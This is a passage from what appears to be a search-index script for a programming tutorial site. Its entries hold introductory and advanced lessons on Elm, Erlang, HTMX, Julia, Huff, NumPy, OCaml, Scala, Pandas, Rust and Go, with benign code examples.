with arguments following the function name. add x y = x + y -- Again, it is best to add type annotations. hypotenuse : Float -\u003e Float -\u003e Float hypotenuse a b = sqrt (a^2 + b^2) -- We can create lambda functions with the `\\[arg] -\u003e [expression]` syntax. hello : String -\u003e String hello = \\s -\u003e \"Hi, \" ++ s -- Function declarations may have the anonymous parameter names denoted by `_`, which are matched but not used in the body. const : a -\u003e b -\u003e a const k _ = k -- Functions are also curried; here we've curried the multiplication -- infix operator with a `2` multiplyBy2 : number -\u003e number multiplyBy2 = (*) 2 -- If-expressions are used to branch on `Bool` values absoluteValue : number -\u003e number absoluteValue number = if number \u003c 0 then negate number else number -- Records are used to hold values with named fields book : { title : String, author : String, pages : Int } book = { title = \"Steppenwolf\" , author = \"Hesse\" , pages = 237 } -- Record access is done with `.` title : String title = book.title -- Record access `.` can also be used as a function author : String author = .author book -- We can create tagged unions with the `type` keyword. -- The following value represents a binary tree. type Tree a = Empty | Node a (Tree a) (Tree a) -- It is possible to inspect these types with case-expressions. depth : Tree a -\u003e Int depth tree = case tree of Empty -\u003e 0 Node _ left right -\u003e 1 + max (depth left) (depth right) "
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/getting_started\/",
                title: "A Getting Started Guide with Erlang",
                description: "Introduction to Erlang, its history, features, and basics of programming.",
                content: "Brief History of Erlang linkErlang was created by Ericsson’s Computer Science Lab in 1986 for handling large-scale telecommunications projects. Its development was driven by the need for a robust system capable of managing numerous concurrent activities with high levels of fault tolerance. Over the years, Erlang has evolved significantly and is now used in various domains, including banking, e-commerce, and instant messaging.\nKey Features of Erlang linkErlang stands out due to its unique features, which include:\nConcurrency and Distributed Computing linkErlang supports numerous lightweight processes and makes it easy to build distributed systems. Each process in Erlang is isolated and communicates with others via message passing, enabling high levels of concurrency without the complexities associated with traditional threading models.\nFault Tolerance linkErlang’s “let it crash” philosophy and robust error-handling mechanisms ensure system reliability. This approach allows developers to write systems that can recover gracefully from unexpected errors, thus maintaining uptime and stability.\nFunctional Programming linkWith its roots in the functional programming paradigm, Erlang emphasizes immutability and side-effect-free functions. This leads to more predictable and maintainable code.\nImportance in the Programming World linkErlang’s ability to handle high-availability systems makes it a critical tool in industries where uptime is crucial. Its impact is most notably seen in telecommunications but extends to other sectors like finance and social media, where scalable, fault-tolerant systems are essential.\nBasics of Erlang Programming linkErlang Syntax and Data Types linkErlang’s syntax is distinct and straightforward, focusing on readability and maintainability. Key points include:\nBasic Syntax Rules linkErlang is case-sensitive, with variables starting with uppercase letters and atoms (constants) with lowercase. Statements are terminated with a period (.).\nData Types link Numbers: Supports both integers and floats. Atoms: Constants whose name is their value (e.g., true, error). Tuples: Fixed-size collections of values {Value1, Value2, ...}. Lists: Variable-length collections [Element1, Element2, ...]. Code Example: Basic Syntax and Data Types\n% Defining variables and using atoms MyNumber = 42. MyAtom = hello. MyTuple = {ok, MyNumber}. MyList = [1, 2, 3, MyAtom]. Control Structures linkErlang’s control structures allow for conditional and repetitive execution of code blocks:\nIf Statements linkUsed for conditional execution based on boolean expressions.\nCase Expressions linkSimilar to switch-case in other languages, allowing pattern matching.\nLoops linkErlang uses recursion instead of traditional loop constructs.\nCode Example: Control Structures\n% If statement if MyNumber \u003e 40 -\u003e io:format(\"Greater than 40~n\"); true -\u003e io:format(\"Not greater than 40~n\") end. % Case expression case MyList of [1, _, _] -\u003e io:format(\"List starts with 1~n\"); _ -\u003e io:format(\"Different list~n\") end. Functions in Erlang linkFunctions are crucial in Erlang:\nDefining Functions linkDefined within modules using the fun keyword.\nFunction Overloading linkErlang supports function overloading based on the number of arguments.\nCode Example: Functions\n-module(example). -export([add/2]). % Function definition add(A, B) -\u003e A + B. Modules and Compilation linkModules are the primary way to organize code in Erlang:\nCreating Modules linkEach file typically contains one module, defined with -module(ModuleName).\nCompilation Process linkErlang code is compiled into bytecode. The erlc command is used for compilation.\nCode Example: Module and Compilation\n-module(hello_world). -export([hello/0]). hello() -\u003e io:format(\"Hello, World!~n\"). To compile: erlc hello_world.erl\nAdvanced Topics linkConcurrency linkErlang’s concurrency model is based on the Actor model. Each process is isolated and communicates with others via message passing. This model simplifies concurrent programming and avoids many issues related to shared state and locking.\nCode Example: Spawning Processes\n-module(concurrency_example). -export([start/0, loop/0]). start() -\u003e Pid = spawn(concurrency_example, loop, []), Pid ! {self(), \"Hello, Process!\"}. loop() -\u003e receive {From, Message} -\u003e io:format(\"Received ~p from ~p~n\", [Message, From]), loop() end. Distributed Computing linkErlang’s distributed computing capabilities allow processes to communicate across different nodes seamlessly. This makes it easy to build scalable and fault-tolerant distributed systems.\nCode Example: Connecting Nodes\n% Start the Erlang shell with a name erl -name node1@hostname % In another shell erl -name node2@hostname -setcookie samecookie % From node1 net_adm:ping('node2@hostname'). Error Handling linkErlang’s approach to error handling is to let processes fail and restart them in a clean state. This is achieved using supervisors.\nCode Example: Supervisor\n-module(supervisor_example). -behaviour(supervisor). -export([start_link/0, init/1]). start_link() -\u003e supervisor:start_link({local, ?MODULE}, ?MODULE, []). init([]) -\u003e {ok, {{one_for_one, 5, 10}, [{child, {child_example, start_link, []}, permanent, 5000, worker, [child_example]}]}}. In summary, Erlang is a powerful language for building concurrent, distributed, and fault-tolerant systems. Its unique features and robust architecture make it a valuable tool in various industries, ensuring system reliability and scalability.\n"
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/getting_started_with_htmx\/",
                title: "A Getting started guide with HTMX",
                description: "Learn about what HTMX is and how you can use it.",
                content: "htmx in a Nutshell linkhtmx is a library that allows you to access modern browser features directly from HTML, rather than using javascript. To understand htmx, first let’s take a look at an anchor tag:\nBlog This anchor tag tells a browser:\n“When a user clicks on this link, issue an HTTP GET request to ‘/blog’ and load the response content into the browser window”.\nWith that in mind, consider the following bit of HTML:\nClick Me! This tells htmx:\n“When a user clicks on this button, issue an HTTP POST request to ‘/clicked’ and use the content from the response to replace the element with the id parent-div in the DOM”.\nhtmx extends and generalizes the core idea of HTML as a hypertext, opening up many more possibilities directly within the language:\nNow any element, not just anchors and forms, can issue an HTTP request Now any event, not just clicks or form submissions, can trigger requests Now any HTTP verb, not just GET and POST, can be used Now any element, not just the entire window, can be the target for update by the request Note that when you are using htmx, on the server side you typically respond with HTML, not JSON. This keeps you firmly within the original web programming model, using Hypertext As The Engine Of Application State without even needing to really understand that concept.\nIt’s worth mentioning that, if you prefer, you can use the data- prefix when using htmx:\nClick Me! Installing linkHtmx is a dependency-free, browser-oriented javascript library. This means that using it is as simple as adding a Download a copy linkThe next easiest way to install htmx is to simply copy it into your project. Download htmx.min.js from unpkg.com and add it to the appropriate directory in your project and include it where necessary with a You can also add extensions this way, by downloading them from the ext/ directory.\nnpm linkFor npm-style build systems, you can install htmx via npm:\nnpm install htmx.org After installing, you’ll need to use appropriate tooling to use node_modules/htmx.org/dist/htmx.js (or .min.js). For example, you might bundle htmx with some extensions and project-specific code.\nWebpack linkIf you are using webpack to manage your javascript:\nInstall htmx via your favourite package manager (like npm or yarn) Add the import to your index.js import 'htmx.org'; If you want to use the global htmx variable (recommended), you need to inject it to the window scope:\nCreate a custom JS file Import this file to your index.js (below the import from step 2) import 'path/to/my_custom.js'; Then add this code to the file:\nwindow.htmx = require('htmx.org'); Finally, rebuild your bundle.\n"
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/tutorials\/docs\/julia\/julia\/getting_started_with_julia\/",
                title: "A Getting Started Guide with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Introduction linkJulia, a high-level, high-performance programming language, is designed for technical computing. It combines the simplicity of Python with the power of languages like C or Fortran. Julia is known for its impressive speed and is widely used in scientific computing, machine learning, data mining, large-scale linear algebra, and more.\nGetting Started with Julia linkInstalling Julia linkTo begin with Julia, the first step is installing the language. Julia can be downloaded from its official website, JuliaLang.org. It’s available for Windows, macOS, and Linux. After downloading, follow the installation instructions specific to your operating system.\nBasic Setup and IDEs linkOnce Julia is installed, you can start coding in the REPL (Read-Eval-Print Loop), which is an interactive command-line interface for Julia. However, for a more comprehensive development environment, IDEs like Juno (built into Atom) and Jupyter Notebooks are recommended. Juno provides an integrated Julia experience, and Jupyter Notebooks are great for mixing code with documentation.\nHello World in Julia linkThe classic ‘Hello World’ program in Julia is simple. Open the Julia REPL or your chosen IDE, and type the following:\nprintln(\"Hello, World!\") This line of code outputs “Hello, World!” to the console, a simple demonstration of Julia’s syntax for printing text.\nBasic Syntax Overview linkJulia’s syntax is user-friendly and similar to other popular programming languages. Here are a few basic syntax rules:\nComments: Single-line comments start with #, and multi-line comments are enclosed within #= ... =#. Variables: Declaring variables doesn’t require explicit types. For example, x = 10 or name = \"Julia\". Math Operations: Standard operators like +, -, *, / are used for mathematical operations. Code Example: Simple Julia Program linkLet’s write a simple program that calculates the sum of two numbers:\n# A simple Julia program to add two numbers # Define the numbers num1 = 5 num2 = 7 # Calculate the sum sum = num1 + num2 # Print the result println(\"The sum is \", sum) This program introduces basic concepts like variable assignment and arithmetic operations.\nFundamental Concepts in Julia linkVariables and Data Types linkIn Julia, variables are used to store data. You don’t need to declare a type for a variable; Julia automatically infers it. Common data types include Int (integer), Float64 (floating-point number), Bool (boolean), and String (text).\nx = 10 # An integer y = 3.14 # A floating-point number is_valid = true # A boolean name = \"Julia\" # A string Control Structures linkControl structures in Julia are used for decision-making and looping, similar to other languages.\nIf Statement: Used for conditional execution. For Loop: Iterates over a range or collection. While Loop: Executes as long as a condition is true. Example of if statement:\na = 10 b = 20 if a \u003e b println(\"a is greater than b\") elseif a \u003c b println(\"a is less than b\") else println(\"a is equal to b\") end Functions and Methods linkFunctions in Julia are used to encapsulate reusable code. They are defined using the function keyword and can return a value using return.\nExample of a function:\nfunction greet(name) return \"Hello, $name!\" end println(greet(\"Kanye\")) "
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/tutorials\/docs\/huff\/huff\/simple_huff_program_to_determine_even_numbers\/",
                title: "A simple Huff Program to Determine Even Number",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "In this tutorial, we are writing a Huff smart contract that checks whether a given number is even or odd. The contract should return 1 if the number is even and 0 if the number is odd.\nNote: For those unfamiliar with calldata, it is a type of input data sent with a transaction. Calldata is stored outside the EVM’s storage and memory, making it cheaper to use.\nBasic Solution linkHere’s a basic Huff contract to solve this problem:\n#define macro MAIN() = takes(0) returns (0) { 0x02 //[0x02] 0x00 calldataload //[input, 0x02] mod //[0 or 1] iszero //[1 or 0] 0x00 mstore 0x20 0x00 return } Explanation linkMAIN Macro linkIn Huff, execution always starts from the MAIN macro. The takes(0) returns(0) indicates that this macro doesn’t read any values from the stack and doesn’t push any value to the stack upon completion.\nLogic link Push 2 to the Stack\n0x02 This pushes the number 2 onto the stack.\nLoad Calldata\n0x00 calldataload The calldataload opcode loads the transaction input data to the stack. The opcode takes one argument, the offset (0x00) to start loading from.\nModulus Operation\nmod The mod opcode takes two inputs from the stack and returns the remainder of the division. If the number is even, the result will be 0.\nCheck if Zero\niszero The iszero opcode checks if the value at the top of the stack is zero. If it is, it returns 1 (indicating the number is even); otherwise, it returns 0 (indicating the number is odd).\nStore Result in Memory\n0x00 mstore The mstore opcode stores the result at memory offset 0x00.\nReturn Result\n0x20 0x00 return The return opcode returns 32 bytes from memory offset 0x00.\nOptimization linkWhile the above code does the job, there is room to save gas. Each time we push 0 onto the stack using 0x00, Huff replaces it with the PUSH opcode, which costs 3 gas.\nThe EVM wizards in the Huff Discord found another way to push 0 onto the stack using the RETURNDATASIZE opcode, which costs only 2 gas. The RETURNDATASIZE opcode pushes the length of the data returned in the last call. Since we haven’t made any external calls, it will push 0 onto the stack.\nOptimized Solution linkHere’s the optimized Huff contract:\n#define macro MAIN() = takes(0) returns (0) { 0x02 //[0x02] returndatasize calldataload //[input, 0x02] mod //[0 or 1] iszero returndatasize mstore 0x20 returndatasize return } Optimization Steps link Push 2 to the Stack\n0x02 Load Calldata with Optimized 0\nreturndatasize calldataload This pushes 0 onto the stack using RETURNDATASIZE, saving 1 gas compared to using 0x00.\nModulus Operation\nmod Check if Zero\niszero Store Result in Memory with Optimized 0\nreturndatasize mstore Return Result with Optimized 0\n0x20 returndatasize return By replacing 0x00 with RETURNDATASIZE in three places, we save 3 gas, equivalent to one PUSH.\nConclusion linkThis optimized Huff contract efficiently determines whether a given number is even or odd. By leveraging the RETURNDATASIZE opcode, we reduce the gas consumption, making the contract more efficient.\n"
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/advanced_array_manipulation\/",
                title: "Advanced Array Manipulation with NumPy",
                description: "...",
                content: "Introduction linkNumPy is a powerful library for numerical computing in Python. While basic array operations are straightforward, advanced array manipulations can significantly optimize your code and enhance performance. This tutorial covers advanced techniques for manipulating arrays, including reshaping, stacking, splitting, broadcasting, vectorization, and using advanced indexing.\n1. Reshaping Arrays link1.1 Changing the Shape of an Array\nimport numpy as np # Creating a 1D array arr = np.arange(12) print(\"Original array:\\n\", arr) # Reshaping to a 3x4 array reshaped_arr = arr.reshape(3, 4) print(\"Reshaped to 3x4 array:\\n\", reshaped_arr) 1.2 Flattening an Array\n# Flattening the array back to 1D flattened_arr = reshaped_arr.ravel() print(\"Flattened array:\\n\", flattened_arr) 1.3 Resizing Arrays\n# Resizing the array (changes original array) arr.resize(2, 6) print(\"Resized array:\\n\", arr) 2. Stacking and Splitting Arrays link2.1 Stacking Arrays\n# Creating two 2x2 arrays A = np.array([[1, 2], [3, 4]]) B = np.array([[5, 6], [7, 8]]) # Vertical stacking vstacked = np.vstack((A, B)) print(\"Vertically stacked array:\\n\", vstacked) # Horizontal stacking hstacked = np.hstack((A, B)) print(\"Horizontally stacked array:\\n\", hstacked) 2.2 Splitting Arrays\n# Splitting the array vertically into 2 arrays vsplit = np.vsplit(vstacked, 2) print(\"Vertically split arrays:\", vsplit) # Splitting the array horizontally into 2 arrays hsplit = np.hsplit(hstacked, 2) print(\"Horizontally split arrays:\", hsplit) 3. Broadcasting link3.1 Basic Broadcasting\n# Creating a 3x1 array x = np.array([[1], [2], [3]]) # Broadcasting with a 1x3 array y = np.array([4, 5, 6]) # Broadcasting and addition result = x + y print(\"Broadcasted addition result:\\n\", result) 3.2 Broadcasting Rules\nIf the arrays do not have the same rank, prepend the shape of the lower-rank array with ones. The two arrays are said to be compatible if they have the same shape or if one of the dimensions is 1. The arrays can be broadcast together if they are compatible. 4. Vectorization link4.1 Vectorized Operations\n# Creating an array of numbers from 0 to 9 arr = np.arange(10) # Vectorized addition vectorized_result = arr + 2 print(\"Vectorized addition result:\\n\", vectorized_result) # Vectorized condition condition_result = arr[arr % 2 == 0] print(\"Elements satisfying the condition (even numbers):\\n\", condition_result) 4.2 Performance Comparison\n# Using a loop loop_result = [] for i in arr: loop_result.append(i + 2) loop_result = np.array(loop_result) print(\"Loop result:\\n\", loop_result) # Vectorized operation is typically much faster 5. Advanced Indexing and Slicing link5.1 Boolean Indexing\n# Boolean indexing to select elements bool_idx = arr \u003e 5 print(\"Boolean index array:\\n\", bool_idx) selected_elements = arr[bool_idx] print(\"Selected elements:\\n\", selected_elements) 5.2 Fancy Indexing\n# Creating an array arr = np.arange(10, 100, 10) print(\"Original array:\\n\", arr) # Fancy indexing with a list of indices fancy_idx = [1, 3, 5] selected_elements = arr[fancy_idx] print(\"Selected elements using fancy indexing:\\n\", selected_elements) 5.3 Multi-dimensional Indexing\n# Creating a 3x3 array arr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) # Indexing with an array of row indices and column indices row_idx = np.array([0, 1, 2]) col_idx = np.array([2, 1, 0]) selected_elements = arr[row_idx, col_idx] print(\"Selected elements using multi-dimensional indexing:\\n\", selected_elements) 6. Using np.where and np.select link6.1 Conditional Selection with np.where\n# Using np.where to replace elements based on a condition arr = np.arange(10) replaced_arr = np.where(arr % 2 == 0, 'even', 'odd') print(\"Array after conditional replacement:\\n\", replaced_arr) 6.2 Multiple Conditions with np.select\n# Using np.select for multiple conditions conditions = [ (arr \u003c 5), (arr \u003e= 5) \u0026 (arr \u003c 8), (arr \u003e= 8) ] choices = ['low', 'medium', 'high'] selected_arr = np.select(conditions, choices) print(\"Array after multiple conditional selection:\\n\", selected_arr) Conclusion linkIn this tutorial, we’ve explored advanced array manipulation techniques using NumPy, including reshaping, stacking, splitting, broadcasting, vectorization, and advanced indexing. These tools and techniques are essential for efficient numerical computing and can greatly enhance the performance and readability of your code.\nThis comprehensive tutorial should provide a solid understanding of advanced array manipulation techniques in NumPy, making your numerical computing tasks more efficient and effective.\n"
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/advanced_ocaml_concepts\/",
                title: "Advanced Concepts in OCaml",
                description: "OCaml is a multi-paradigm programming language, an extension of the Caml language, and a member of the ML (Meta Language) family.",
                content: "Advanced OCaml Concepts linkAs we delve deeper into OCaml, we encounter advanced features that provide powerful tools for software development. These include modules, error handling, and object-oriented features.\nModules and Namespaces linkModules in OCaml are like containers for types, functions, and sub-modules, providing a way to organize and reuse code. They act as namespaces to prevent naming conflicts.\nHere’s how to define a simple module:\nmodule MathOps = struct let add a b = a + b let subtract a b = a - b end;; You can access module contents using the dot notation:\nlet result = MathOps.add 5 3;; Error Handling and Exceptions linkOCaml handles errors through exceptions. An exception is raised using the raise function and handled using the try...with construct.\nExample of defining and handling an exception:\nexception DivideByZero;; let divide a b = if b = 0 then raise DivideByZero else a / b;; try let result = divide 10 0 in print_endline (string_of_int result) with DivideByZero -\u003e print_endline \"Cannot divide by zero\";; Object-Oriented Features in OCaml linkOCaml supports object-oriented programming (OOP), allowing the definition of classes and objects. However, OOP in OCaml is used less frequently compared to its functional features.\nExample of a simple class in OCaml:\nclass counter = object val mutable count = 0 method get_count = count method increment = count \u003c- count + 1 end;; let myCounter = new counter;; myCounter#increment;; print_endline (string_of_int myCounter#get_count);; Code Example: File Operations linkThis example demonstrates reading from and writing to files, showcasing modular programming and exception handling:\nlet read_file filename = let channel = open_in filename in try while true; do let line = input_line channel in print_endline line done with End_of_file -\u003e close_in channel;; let write_file filename content = let channel = open_out filename in output_string channel content; close_out channel;; (* Usage *) write_file \"test.txt\", \"Hello, OCaml!\"; read_file \"test.txt\";; "
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/tutorials\/docs\/scala\/scala\/advanced_concepts_in_scala\/",
                title: "Advanced Concepts in Scala",
                description: "Scala Lang description",
                content: "Advanced Concepts linkScala offers several advanced features, including pattern matching, case classes, and implicit parameters and conversions.\nPattern Matching\nPattern matching in Scala is a powerful tool for checking a value against a pattern.\nBasic Syntax:\nval number = 3 number match { case 1 =\u003e println(\"One\") case 2 =\u003e println(\"Two\") case 3 =\u003e println(\"Three\") case _ =\u003e println(\"Something else\") } Pattern Matching with Case Classes:\ncase class Person(name: String, age: Int) val alice = Person(\"Alice\", 25) alice match { case Person(\"Alice\", 25) =\u003e println(\"Hi Alice!\") case _ =\u003e println(\"Not Alice\") } Case Classes\nCase classes are immutable by default and decomposable through pattern matching.\nDefining a Case Class: case class Point(x: Int, y: Int) Implicit Parameters and Conversions\nScala allows defining parameters as implicit, which are automatically passed by the compiler.\nImplicit Parameters:\ndef greet(implicit name: String): Unit = println(s\"Hello, $name!\") implicit val myName: String = \"Bob\" greet // Outputs: Hello, Bob! Implicit Conversions:\nimplicit def intToString(value: Int): String = value.toString val myString: String = 123 // Automatically converts Int to String Code Example: Advanced Scala Program\nHere’s a Scala program demonstrating these advanced concepts:\ncase class Student(name: String, grade: Int) object AdvancedScalaApp { def main(args: Array[String]): Unit = { val student = Student(\"Alice\", 1) student match { case Student(\"Alice\", 1) =\u003e println(\"Welcome Alice in grade 1!\") case _ =\u003e println(\"Unknown student\") } implicit val defaultName: String = \"John\" greet // Outputs: Hello, John! val myString: String = 2024 println(myString) // Outputs: \"2024\" } def greet(implicit name: String): Unit = println(s\"Hello, $name!\") } This program defines a case class Student, demonstrates pattern matching, and showcases implicit parameters and conversions.\n"
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/advanced_data_aggregation\/",
                title: "Advanced Data Aggregation and Grouping in Pandas",
                description: "Data aggregation and grouping are essential techniques for data analysis, allowing you to summarize and transform your data in various ways. This tutorial covers:\nGrouping data Applying aggregation functions Performing custom aggregations Handling missing values Multi-level grouping and aggregation Creating a Sample DataFrame linkWe’ll start by creating a sample DataFrame to demonstrate these concepts.\nimport pandas as pd # Create sample DataFrame data = { 'Region': ['East', 'West', 'East', 'West', 'East', 'West'], 'Category': ['Electronics', 'Electronics', 'Clothing', 'Clothing', 'Electronics', 'Clothing'], 'Sales': [1000, 1500, 1200, 800, 900, 1100], 'Price': [500, 600, 300, 400, 450, 350], 'Quantity': [2, 3, 4, 2, 3, 4] } df = pd.",
                content: "Data aggregation and grouping are essential techniques for data analysis, allowing you to summarize and transform your data in various ways. This tutorial covers:\nGrouping data Applying aggregation functions Performing custom aggregations Handling missing values Multi-level grouping and aggregation Creating a Sample DataFrame linkWe’ll start by creating a sample DataFrame to demonstrate these concepts.\nimport pandas as pd # Create sample DataFrame data = { 'Region': ['East', 'West', 'East', 'West', 'East', 'West'], 'Category': ['Electronics', 'Electronics', 'Clothing', 'Clothing', 'Electronics', 'Clothing'], 'Sales': [1000, 1500, 1200, 800, 900, 1100], 'Price': [500, 600, 300, 400, 450, 350], 'Quantity': [2, 3, 4, 2, 3, 4] } df = pd.DataFrame(data) print(\"Sample DataFrame:\") print(df) Grouping Data linkTo group data, use the groupby() method. This example groups the data by 'Region' and 'Category'.\n# Grouping data by 'Region' and 'Category' grouped = df.groupby(['Region', 'Category']) Aggregating Data linkAggregation functions such as sum(), mean(), and max() can be applied to grouped data.\nSingle Aggregation Functions link # Aggregating data within groups agg_result = grouped.agg({ 'Sales': 'sum', 'Price': 'mean', 'Quantity': 'max' }) print(\"Aggregated Data:\") print(agg_result) Multiple Aggregation Functions linkYou can apply multiple aggregation functions to each column.\n# Applying multiple aggregations multi_agg_result = grouped.agg({ 'Sales': ['sum', 'mean'], 'Price': ['min', 'max'], 'Quantity': 'sum' }) print(\"\\nMultiple Aggregations:\") print(multi_agg_result) Handling Missing Values linkTo handle missing values during aggregation, you can use the fillna() method or specify how to handle NaN values directly in the aggregation functions.\n# Creating a DataFrame with missing values data_with_nan = { 'Region': ['East', 'West', 'East', 'West', 'East', 'West'], 'Category': ['Electronics', 'Electronics', 'Clothing', 'Clothing', 'Electronics', 'Clothing'], 'Sales': [1000, 1500, 1200, 800, None, 1100], 'Price': [500, 600, 300, 400, 450, None], 'Quantity': [2, 3, 4, 2, 3, 4] } df_nan = pd.DataFrame(data_with_nan) # Filling missing values df_nan_filled = df_nan.fillna(0) grouped_nan = df_nan_filled.groupby(['Region', 'Category']).sum() print(\"\\nData with Missing Values Handled:\") print(grouped_nan) Custom Aggregation Functions linkYou can create custom aggregation functions and apply them using agg().\n# Custom aggregation function def range_values(series): return series.max() - series.min() custom_agg_result = grouped.agg({ 'Sales': range_values, 'Price': range_values }) print(\"\\nCustom Aggregation:\") print(custom_agg_result) Accessing Individual Groups linkYou can iterate through each group and access its data.\n# Grouping by multiple columns multi_column_grouped = df.groupby(['Region', 'Category']) # Accessing individual groups for name, group in multi_column_grouped: print(f\"\\nGroup: {name}\") print(group) Multi-level Grouping and Aggregation linkPandas supports multi-level (hierarchical) grouping and aggregation.\n# Aggregating with multi-level grouping multi_level_agg = df.groupby(['Region', 'Category']).agg({ 'Sales': ['sum', 'mean'], 'Price': ['min', 'max'], 'Quantity': 'sum' }) print(\"\\nMulti-level Aggregation:\") print(multi_level_agg) Conclusion linkThis tutorial covers advanced data aggregation and grouping techniques in Pandas. By mastering these techniques, you can perform complex data analyses and derive meaningful insights from your data. Experiment with different datasets and aggregation functions to further enhance your skills.\n"
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/tutorials\/docs\/rust\/rust\/advanced_enums_pattern_matching_rust\/",
                title: "Advanced Enums and Pattern Matching in Rust",
                description: "Explore the powerful capabilities of enums and pattern matching in Rust, including how to define enums with variants, and effectively use match and if let constructs for clean and safe code. This in-depth guide is filled with technical explanations and practical examples aimed at proficient Rust programming",
                content: "Introduction linkEnums and pattern matching are two of Rust’s most powerful features, enabling programmers to write flexible, expressive, and safe code. Enums allow you to define a type by enumerating its possible variants, and pattern matching provides a way to execute different code paths based on which variant an enum value is. This post delves deep into both concepts, demonstrating their utility and efficiency in real-world Rust applications.\nUnderstanding Enums linkEnums in Rust are types that can encapsulate different kinds of data in each of its variants. Unlike enums in some other languages, Rust’s enums can store different amounts and types of values depending on their needs.\nBasic Definition of an Enum:\nenum WebEvent { PageLoad, PageUnload, KeyPress(char), Paste(String), Click { x: i64, y: i64 }, } This WebEvent enum represents different types of web events that can occur. Some variants, like PageLoad and PageUnload, do not store additional data, whereas variants like KeyPress and Paste store additional data associated with them.\nUsing Enums to Handle Variants linkEnums are particularly useful when you have multiple types that might have different kinds of associated data but you want to handle them together.\nExample of Enum Usage:\nfn inspect(event: WebEvent) { match event { WebEvent::PageLoad =\u003e println!(\"page loaded\"), WebEvent::PageUnload =\u003e println!(\"page unloaded\"), WebEvent::KeyPress(c) =\u003e println!(\"pressed '{}'\", c), WebEvent::Paste(s) =\u003e println!(\"pasted \\\"{}\\\"\", s), WebEvent::Click { x, y } =\u003e println!(\"clicked at x={}, y={}\", x, y), } } In this function, inspect uses a match statement to determine what to do based on the variant of WebEvent. Each arm of the match corresponds to a variant of the enum, allowing for variant-specific behavior.\nPattern Matching with match and if let linkPattern matching in Rust is handled primarily through the match statement, which is a versatile and powerful feature for branching based on the patterns of enums, literals, or even complex data structures.\nAdvanced match Example:\nmatch some_value { 1 =\u003e println!(\"one\"), 2 | 3 | 5 | 7 | 11 =\u003e println!(\"this is a prime\"), other if other % 2 == 0 =\u003e println!(\"some even number\"), _ =\u003e println!(\"anything\"), } Here, match checks some_value against a series of patterns and executes the associated code block of the first matching pattern.\nUsing if let for Simpler Cases:\nlet some_option_value = Some(7); if let Some(x) = some_option_value { println!(\"the value is: {}\", x); } if let is a convenient shorthand for a match that runs code for one pattern and ignores others. It’s particularly useful when you are only interested in one variant of an enum.\nPractical Applications of Enums and Pattern Matching linkEnums combined with pattern matching offer a robust framework for handling various programming scenarios, from simple to complex ones.\nHandling State Transitions:\nenum State { Inactive, Active, Terminated, } let state = State::Active; match state { State::Inactive =\u003e println!(\"Inactive\"), State::Active =\u003e { // Activate some feature println!(\"Active\") }, State::Terminated =\u003e println!(\"Terminated\"), } This setup is ideal for managing state transitions in applications like games or user interfaces.\nError Handling: Enums are extensively used in Rust for error handling. Each variant can represent a different error case, allowing precise control over error management.\nConclusion linkEnums and pattern matching are indispensable tools in Rust that provide expressiveness, type safety, and control flow management. By mastering these concepts, Rust programmers can handle any logical branching in their code cleanly and efficiently, leveraging Rust’s strong type system and exhaustive pattern checking to write robust applications.\n"
            }
        );
    index.add(
            {
                id:  26 ,
                href: "\/tutorials\/docs\/golang\/golang\/error-handling-and-panics-in-go\/",
                title: "Advanced Error Handling in Go",
                description: "Master the art of error handling in Go with this detailed guide. Learn about error handling techniques, how to create and use custom errors, and how to effectively use defer, panic, and recover in your applications.",
                content: "Introduction:\nHello, Go developers! Error handling is a critical component of robust application development. Unlike many programming languages that use exceptions for error handling, Go uses a distinct approach that encourages explicit error checking, which can lead to more reliable and understandable code. In this blog, we’ll dive deep into Go’s error handling strategies, exploring how to handle errors effectively, create and use custom errors, and utilize Go’s defer, panic, and recover mechanisms to manage exceptional situations gracefully.\n1. Error Handling Techniques\nIn Go, error handling is performed by checking if an error returned from a function is nil or not. This approach is straightforward and makes it clear which functions can cause errors that need to be handled.\nExample of Basic Error Handling:\nfunc readFile(filename string) error { _, err := os.ReadFile(filename) if err != nil { return err } return nil } func main() { err := readFile(\"example.txt\") if err != nil { log.Fatalf(\"Failed to read file: %s\", err) } fmt.Println(\"File read successfully\") } 2. Creating and Using Custom Errors\nGo allows you to create custom error types by implementing the error interface, which requires just one method: Error() string. This can be useful for handling specific error conditions in your application.\nCreating a Custom Error Type:\ntype NotFoundError struct { Filename string } func (e *NotFoundError) Error() string { return fmt.Sprintf(\"File %s not found\", e.Filename) } func getFile(filename string) error { _, err := os.Stat(filename) if os.IsNotExist(err) { return \u0026NotFoundError{Filename: filename} } return nil } Using Custom Errors:\nerr := getFile(\"missingfile.txt\") if err != nil { if _, ok := err.(*NotFoundError); ok { fmt.Println(err) // Handle not found error specifically } else { log.Fatal(err) } } 3. Defer, Panic, and Recover\na. Defer:\nThe defer keyword is used to ensure that a function call is performed later in a program’s execution, typically for cleanup purposes. Defer is often used where features like finally would be used in other languages.\nfunc readFile(filename string) { f, err := os.Open(filename) if err != nil { log.Fatalf(\"failed to open the file: %s\", err) } defer f.Close() // Ensure the file is closed as soon as the function completes } b. Panic:\nPanic is a built-in function that stops the ordinary flow of control and begins panicking. When the function panic is called, it will stop executing any further and return the control to the first deferred function (if any).\nfunc riskyFunction() { defer fmt.Println(\"Deferred calls are run even if it panics\") panic(\"a problem occurred\") } c. Recover:\nRecover is a built-in function that regains control of a panicking goroutine. Recover is only useful inside deferred functions.\nfunc saveFromPanic() { if r := recover(); r != nil { fmt.Println(\"Recovered from error:\", r) } } func mayPanic() { defer saveFromPanic() panic(\"something bad happened\") } func main() { mayPanic() fmt.Println(\"Returned normally from mayPanic.\") } Conclusion:\nError handling in Go is built to be clear and explicit, minimizing hidden control flows and making it easier to reason about error handling paths. By leveraging custom errors and the defer, panic, and recover mechanisms, you can write safer, more predictable Go applications that are easier to maintain. Embrace these practices and 